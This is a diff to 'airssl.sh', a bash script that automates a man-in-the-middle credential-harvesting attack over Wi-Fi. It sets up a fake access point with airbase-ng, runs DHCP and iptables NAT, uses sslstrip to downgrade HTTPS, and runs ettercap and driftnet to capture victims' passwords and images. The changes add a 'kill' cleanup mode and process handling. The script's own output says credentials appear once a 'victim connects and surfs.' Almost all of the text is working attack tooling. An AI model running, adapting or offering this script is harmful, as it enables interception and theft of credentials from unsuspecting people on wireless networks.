@@ -3,7 +3,46 @@
 # airssl.sh - v2.1-adapt
 # visit the man page NEW SCRIPT Capturing Passwords With sslstrip AIRSSL.sh
 
-if [ "$1" == "start" ];then
+if [ "$1" == "kill" ];then
+# Clean up if not pressed y
+echo
+echo "[+] Cleaning up airssl and resetting iptables..."
+
+echo -n "Enter your interface used for the fake AP, generally wlan0 or wlan1: "
+fakeap_interface="mon0"
+
+pkill airbase-ng
+echo "[+] Airbase-ng (fake ap) killed"
+pkill dhcpd
+echo "[+] DHCP killed"
+pkill sslstrip
+echo "[+] SSLStrip killed"
+pkill ettercap
+echo "[+] Ettercap killed"
+pkill driftnet
+echo "[+] Driftnet killed"
+pkill sslstrip.log
+echo "[+] SSLStrip log killed"
+
+airmon-ng stop $fakeap_interface
+airmon-ng stop $fakeap
+echo "[+] Airmon-ng stopped"
+echo
+echo "0" > /proc/sys/net/ipv4/ip_forward
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+echo "[+] iptables restored"
+echo
+ifconfig $internet_interface up
+/etc/init.d/networking restart
+echo "[+] Restarting network..."
+
+echo "[+] Clean up successful..."
+echo "[+] Thank you for using airssl, Good Bye..."
+exit
+else
 # Network questions
 echo
 echo "AIRSSL 2.1-adapt - Ubuntu working - Credits killadaninja & G60Jon - Adaptation by Nyzo"
@@ -60,25 +99,27 @@ fi
 
 if [ $ANSWER = "y" ] ; then
 echo
-echo -n "Enter switches, note you have already chosen an ESSID -e this cannot be 
-redefined, also in this mode you MUST define a channel "
+echo -n "Enter switches, note you have already chosen an ESSID -e this cannot be redefined, also in this mode you MUST define a channel "
 read -e aswitch
 echo
 echo "[+] Starting FakeAP..."
-xterm -geometry 75x15+1+0 -T "FakeAP - $fakeap - $fakeap_interface" -e airbase-ng "$aswitch" -e "$ESSID" $fakeap_interface & fakeapid=$!
+xterm -xrm '*hold: true' -geometry 75x15+1+0 -T "FakeAP - $fakeap - $fakeap_interface" -e airbase-ng "$aswitch" --essid "$ESSID" $fakeap_interface & fakeapid=$!
+disown
 fi
 
 if [ $ANSWER = "a" ] ; then
 echo
 echo "[+] Starting FakeAP..."
-xterm -geometry 75x15+1+0 -T "FakeAP - $fakeap - $fakeap_interface" -e airbase-ng -P -C 30 $fakeap_interface & fakeapid=$!
+xterm -xrm '*hold: true' -geometry 75x15+1+0 -T "FakeAP - $fakeap - $fakeap_interface" -e airbase-ng -P -C 30 $fakeap_interface & fakeapid=$!
+disown
 fi
 
 
 if [ $ANSWER = "n" ] ; then
 echo
 echo "[+] Starting FakeAP..."
-xterm -geometry 75x15+1+0 -T "FakeAP - $fakeap - $fakeap_interface" -e airbase-ng -c 1 -e "$ESSID" $fakeap_interface & fakeapid=$!
+xterm -xrm '*hold: true' -geometry 75x15+1+0 -T "FakeAP - $fakeap - $fakeap_interface" -e airbase-ng -c 1 --essid "$ESSID" $fakeap_interface & fakeapid=$!
+disown
 fi
 
 # Tables
@@ -106,7 +147,8 @@ chmod 777 /var/run/
 touch /var/run/dhcpd.pid
 chmod 777 /var/run/dhcpd.pid
 chown dhcpd:dhcpd /var/run/dhcpd.pid
-xterm -geometry 75x20+1+100 -T DHCP -e dhcpd -f -d -cf "/pentest/wireless/airssl/dhcpd.conf" at0 & dchpid=$!
+xterm -xrm '*hold: true' -geometry 75x20+1+100 -T DHCP -e dhcpd -f -d -cf "/pentest/wireless/airssl/dhcpd.conf" at0 & dchpid=$!
+disown
 
 # Sslstrip
 echo "[+] Starting sslstrip..."
@@ -115,9 +157,7 @@ xterm -geometry 75x15+1+200 -T SSL-Strip -e sslstrip -f -p -k 10000 & sslstripid
 # Ettercap
 echo "[+] Configuring ettercap..."
 echo
-echo "Ettercap will run in its most basic mode, would you like to
-configure any extra switches for example to load plugins or filters,
-(advanced users only), if you are unsure choose N "
+echo "Ettercap will run in its most basic mode, would you like to configure any extra switches for example to load plugins or filters, (advanced users only), if you are unsure choose N "
 echo "Y or N "
 read ETTER
 if [ $ETTER = "y" ] ; then
@@ -133,14 +173,15 @@ DO NOT use the -w switch, also if you enter no switches here ettercap will fail 
 echo
 read "eswitch"
 echo "[+] Starting ettercap..."
-xterm -geometry 73x25+1+300 -T Ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u "$eswitch" -T -q -i at0 & ettercapid=$!
+xterm -xrm '*hold: true' -geometry 73x25+1+300 -T Ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u "$eswitch" -T -q -i at0 & ettercapid=$!
 disown
 fi
 
 if [ $ETTER = "n" ] ; then
 echo
 echo "[+] Starting ettercap..."
-xterm -geometry 73x25+1+300 -T Ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w /pentest/wireless/airssl/passwords -i at0 & ettercapid=$!
+xterm -xrm '*hold: true' -geometry 73x25+1+300 -T Ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w /pentest/wireless/airssl/passwords -i at0 & ettercapid=$!
+disown
 fi
 
 # Driftnet
@@ -166,30 +207,25 @@ echo "[+] Activated..."
 echo "Airssl is now running, after victim connects and surfs their credentials will be displayed in ettercap. You may use right/left mouse buttons to scroll up/down ettercaps xterm shell, ettercap will also save its output to /pentest/wireless/airssl/passwords unless you stated otherwise. Driftnet images will be saved to /pentest/wireless/airssl/driftftnetdata "
 echo
 echo "[+] IMPORTANT..."
-echo "After you have finished please close airssl (press enter) and clean up properly by command ./airssl.sh stop, airssl is not closed properly ERRORS WILL OCCUR "
-exit
+echo "After you have finished please close airssl and clean up properly by hitting Y, if airssl is not closed properly ERRORS WILL OCCUR! Run ./airssl.sh kill if you not pressed y"
+read WISH
 
-elif [ "$1" == "stop" ] ; then
 # Clean up
+if [ $WISH = "y" ] ; then
 echo
 echo "[+] Cleaning up airssl and resetting iptables..."
 
-echo -n "Enter your interface used for the fake AP, generally wlan0 or wlan1: "
-read -e fakeap_interface
-fakeap=$fakeap_interface
-fakeap_interface="mon0"
-
-pkill airbase-ng
+kill ${fakeapid}
 echo "[+] Airbase-ng (fake ap) killed"
-pkill dhcpd
+kill ${dchpid}
 echo "[+] DHCP killed"
-pkill sslstrip
+kill ${sslstripid}
 echo "[+] SSLStrip killed"
-pkill ettercap
+kill ${ettercapid}
 echo "[+] Ettercap killed"
-pkill driftnet
+kill ${driftnetid}
 echo "[+] Driftnet killed"
-pkill sslstrip.log
+kill ${sslstriplogid}
 echo "[+] SSLStrip log killed"
 
 airmon-ng stop $fakeap_interface
@@ -203,14 +239,15 @@ iptables --delete-chain
 iptables --table nat --delete-chain
 echo "[+] iptables restored"
 echo
-ifconfig wlan0 up
+ifconfig $internet_interface up
+/etc/init.d/networking restart
+echo "[+] Restarting network..."
 
 echo "[+] Clean up successful..."
 echo "[+] Thank you for using airssl, Good Bye..."
+fi
 exit
 
-else
-echo "usage: ./airssl.sh stop|start"
 fi
 
 exit
